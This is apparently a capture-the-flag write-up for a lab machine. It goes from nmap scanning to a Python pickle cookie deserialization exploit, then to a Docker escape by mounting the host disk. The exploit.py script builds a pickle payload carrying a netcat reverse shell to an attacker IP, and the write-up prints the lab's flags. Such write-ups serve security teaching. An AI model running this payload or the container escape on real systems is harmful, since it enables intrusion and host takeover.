# **ack10-Registrar-V2**

## **Executive Summary**

The **Hack10-Registrar-V2** machine presents a two-stage attack path. Initial access was achieved by exploiting an Insecure Deserialization vulnerability in a Python Flask web application (Werkzeug) via a manipulated session cookie. This granted a root shell inside a Docker container. The final privilege escalation involved breaking out of the container by exploiting excessive deployment privileges, specifically mounting an exposed host block device to access the underlying host filesystem.

## **Reconnaissance & Enumeration**

The engagement began with an aggressive Nmap scan to identify active services and potential entry points.

**Network Scanning**

```sql
nmap -sC -sV -A -p- -oN nmap_report.txt 192.168.0.49
```

<img width="941" height="596" alt="image" src="https://github.com/user-attachments/assets/4b5335ec-4790-45f1-b01f-712a7b514d5f" />

**Key Findings:**

- **Port 21 (FTP):** vsftpd 3.0.5. Anonymous login was attempted but failed.
- **Port 80 (HTTP):** Python Werkzeug 3.1.8 app displaying a "Registrar Portal" with a guest restriction message.
- **Port 8080 (HTTP):** Default Nginx installation.

<img width="927" height="697" alt="image" src="https://github.com/user-attachments/assets/f38be770-33b7-43bf-a950-5fb90195462d" />

### **Web Application Analysis (Port 80)**

Initial directory brute-forcing with `gobuster` yielded no hidden paths, suggesting the application relied entirely on dynamic routes. Interacting with the web app via `curl` revealed a session cookie being assigned to the guest user.

<img width="932" height="200" alt="image" src="https://github.com/user-attachments/assets/b3c5beaa-dcea-4652-a5ea-438bb7fbff04" />

## **Initial Access (Insecure Deserialization to RCE)**

The session cookie's base64 string began with `gASV...`, which is the distinct signature of a **Python Pickle (Protocol 4)** serialized object.

### **Analyzing the Serialized Data**

Decoding the base64 string confirmed the application was storing user state directly in the cookie:

<img width="836" height="97" alt="image" src="https://github.com/user-attachments/assets/63bd681b-0ab1-422e-82d1-f3f7a490e82a" />

### **Weaponizing the Cookie**

Because the server deserializes this cookie without cryptographic validation, it is vulnerable to arbitrary code execution. A Python script was created to generate a malicious Pickle payload containing a bash reverse shell.

**exploit.py:**

```sql
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.0.47 4444 >/tmp/f")
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE(), protocol=4)
    print(base64.urlsafe_b64encode(pickled).decode('utf-8'))
```

### **Triggering the Exploit**

After starting a netcat listener (`nc -lvnp 4444`), the malicious cookie was injected into a GET request:

<img width="929" height="169" alt="image" src="https://github.com/user-attachments/assets/420ea156-7ea2-4485-abfc-310a99f349e6" />

<img width="712" height="120" alt="image" src="https://github.com/user-attachments/assets/2a5bfe45-0c97-4e71-8781-86244499d7d6" />

## **Container Discovery & User Flag**

Although the initial shell was spawned as `root`, environment enumeration quickly revealed it was isolated inside a Docker container.

#### **Environment Verification**

```sql
ls -la /.dockerenv
ip a
```

<img width="860" height="404" alt="image" src="https://github.com/user-attachments/assets/74d77009-2fab-47d7-b9fa-87f153d3f9e2" />

The presence of `/.dockerenv` and a `docker0` interface (alongside the host's main `enp0s3` interface) confirmed the containerized environment.

### **Retrieving the User Flag**

The first flag was located in the home directory of the `appuser` account inside the container:

<img width="760" height="49" alt="image" src="https://github.com/user-attachments/assets/c0e48e29-3d55-4165-bdd0-81d0156c2064" />

**User Flag:** `hack10{p1ckl3_d3s3r14l1z4t10n_w00t}`

## **Privilege Escalation (Docker Escape)**

To compromise the underlying host machine, the container's deployment configuration was audited for escape vectors.

### **Identifying the Misconfiguration**

Checking the `/dev` directory revealed that the host machine's physical block devices were exposed directly to the container, indicating it was run with excessive privileges (likely `--privileged`).

<img width="714" height="83" alt="image" src="https://github.com/user-attachments/assets/649f5c6e-65f1-4015-a7b1-8b0e792fd592" />

### **Executing the Escape**

With access to the host's main filesystem partition (`/dev/sda1`), the escape was executed by simply mounting the drive to a local directory within the container.

<img width="630" height="66" alt="image" src="https://github.com/user-attachments/assets/5dc2c6a0-c307-4382-b04c-7fb97abfa7fe" />

### **Claiming the Root Flag**

With the host filesystem mounted, the final flag was extracted directly from the host's root directory:

<img width="619" height="50" alt="image" src="https://github.com/user-attachments/assets/35c010bd-af64-402b-b784-15cc9580d92c" />

<img width="678" height="74" alt="image" src="https://github.com/user-attachments/assets/2bb73054-1c87-4b7f-a39b-e7b844aac38a" />

**Root Flag:** `hack10{d0ck3r_s0ck3t_3sc4p3_t0_h0st}`
